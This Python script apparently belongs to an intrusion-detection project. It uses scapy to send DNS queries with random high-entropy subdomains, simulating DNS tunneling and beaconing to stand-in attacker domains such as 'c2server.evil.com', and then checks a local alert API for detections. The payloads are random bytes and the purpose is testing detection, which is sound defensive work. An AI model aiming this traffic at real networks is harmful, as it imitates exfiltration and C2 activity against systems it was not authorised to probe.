#!/usr/bin/env python3
"""
ThreatMatrix AI — Attack Simulation: DNS Tunneling
===================================================

Scenario: Send DNS queries with high-entropy subdomains to simulate
DNS tunneling / data exfiltration via DNS.

Expected: Autoencoder detects unusual DNS pattern with high entropy payload.
Alert Severity: MEDIUM

Usage:
    python3 03_dns_tunnel.py [TARGET_IP]

Requires: scapy (pip install scapy)
Must run with root/sudo for raw socket access.
"""

import sys
import os
import json
import time
import string
import random
import base64
import subprocess

try:
    from scapy.all import IP, UDP, DNS, DNSQR, send, conf
    conf.verb = 0  # Suppress Scapy output
except ImportError:
    print("[ERROR] scapy not found. Install with: pip install scapy")
    sys.exit(1)

TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
DNS_PORT = 53
API_URL = sys.argv[2] if len(sys.argv) > 2 else "http://localhost:8000/api/v1"
NUM_QUERIES = 50

# ANSI colors
RED = "\033[0;31m"
GREEN = "\033[0;32m"
CYAN = "\033[0;36m"
YELLOW = "\033[1;33m"
NC = "\033[0m"


def generate_high_entropy_subdomain(length=40):
    """Generate a high-entropy subdomain string simulating DNS tunneling data."""
    # Base64-encoded random data placed in subdomain
    raw = os.urandom(length)
    encoded = base64.b64encode(raw).decode().rstrip("=").replace("+", "a").replace("/", "b")
    # Split into DNS label segments (max 63 chars per label)
    labels = []
    domain_parts = ["exfil", "tunnel", "data", "dns"]
    tlds = ["com", "net", "io", "xyz"]

    # Build: <high_entropy>.<random>.<tld>
    labels.append(encoded[:40])
    labels.append(random.choice(domain_parts))
    labels.append(random.choice(tlds))
    return ".".join(labels)


def generate_crafted_queries():
    """Generate various DNS query patterns that simulate tunneling."""
    queries = []

    # Pattern 1: Long high-entropy subdomains (classic DNS tunneling)
    for _ in range(20):
        queries.append(generate_high_entropy_subdomain(40))

    # Pattern 2: TXT record queries (common in DNS tunneling)
    for _ in range(10):
        queries.append(generate_high_entropy_subdomain(30))

    # Pattern 3: Very long domain names (exceeding normal lengths)
    for _ in range(10):
        sub = "".join(random.choices(string.ascii_lowercase + string.digits, k=80))
        queries.append(f"{sub}.tunnel-data-exfil.net")

    # Pattern 4: Rapid sequential queries to same domain (beaconing)
    for _ in range(10):
        seq = random.randint(1000, 9999)
        queries.append(f"beacon-{seq}.c2server.evil.com")

    return queries


def get_alert_count():
    """Get current alert count from the API."""
    try:
        result = subprocess.run(
            ["curl", "-s", f"{API_URL}/alerts/stats"],
            capture_output=True, text=True, timeout=10
        )
        data = json.loads(result.stdout)
        return data.get("total", data.get("total_alerts", 0))
    except Exception:
        return 0


def main():
    print(f"""{CYAN}╔══════════════════════════════════════════════════════════════╗
║  ThreatMatrix AI — Attack Simulation: DNS Tunneling         ║
╚══════════════════════════════════════════════════════════════╝{NC}
""")

    if os.geteuid() != 0:
        print(f"{YELLOW}[!] Warning: Not running as root. Raw sockets may fail.")
        print(f"    Run with: sudo python3 03_dns_tunnel.py{NC}")
        print()

    # Record pre-attack count
    print(f"{YELLOW}[*] Recording pre-attack alert count...{NC}")
    pre_count = get_alert_count()
    print(f"    Pre-attack alert count: {pre_count}")
    print()

    # Generate queries
    queries = generate_crafted_queries()
    print(f"{YELLOW}[*] Sending {len(queries)} high-entropy DNS queries to {TARGET}:{DNS_PORT}...{NC}")
    print(f"    Patterns: long subdomains, TXT lookups, beaconing, exfiltration")
    print()

    sent = 0
    for i, qname in enumerate(queries):
        try:
            pkt = IP(dst=TARGET) / UDP(dport=DNS_PORT) / DNS(rd=1, qd=DNSQR(qname=qname))
            send(pkt)
            sent += 1
            if (i + 1) % 10 == 0:
                print(f"    Sent {i + 1}/{len(queries)} queries...")
            time.sleep(0.05)  # Small delay to avoid overwhelming
        except Exception as e:
            print(f"    {RED}Failed to send query {i+1}: {e}{NC}")

    print()
    print(f"{GREEN}[+] Sent {sent}/{len(queries)} DNS tunneling queries.{NC}")
    print(f"{YELLOW}[*] Waiting 30 seconds for ML scoring + alert creation...{NC}")
    print()

    # Poll for new alerts
    for i in range(1, 7):
        time.sleep(5)
        current_count = get_alert_count()
        new_alerts = current_count - pre_count
        print(f"    [{i}/6] Current alerts: {current_count} (+{new_alerts} new)")

        if new_alerts > 0:
            print()
            print(f"{GREEN}[+] ALERT DETECTED! {new_alerts} new alert(s) generated.{NC}")
            print()

            # Fetch latest alerts
            try:
                result = subprocess.run(
                    ["curl", "-s", f"{API_URL}/alerts/?limit=3"],
                    capture_output=True, text=True, timeout=10
                )
                data = json.loads(result.stdout)
                alerts = data if isinstance(data, list) else data.get("alerts", data.get("items", []))

                print(f"{CYAN}[*] Latest alerts:{NC}")
                for a in alerts[:3]:
                    sev = a.get("severity", "?").upper()
                    cat = a.get("category", "?")
                    title = a.get("title", "?")
                    conf = a.get("confidence", 0)
                    print(f"  [{sev}] {title}")
                    print(f"    Category: {cat} | Confidence: {conf:.0%}")
                    print(f"    ID: {a.get('alert_id', '?')}")
                    narrative = a.get("ai_narrative", "")
                    if narrative:
                        print(f"    AI Narrative: {narrative[:120]}...")
                    print()
            except Exception:
                print("  (could not parse alerts)")

            return

    print(f"{YELLOW}[!] No new alerts detected after 30 seconds.{NC}")
    print(f"    DNS tunneling patterns may not trigger immediate alerts.")
    print(f"    Check manually: curl {API_URL}/flows/?protocol=17 | head -20")


if __name__ == "__main__":
    main()
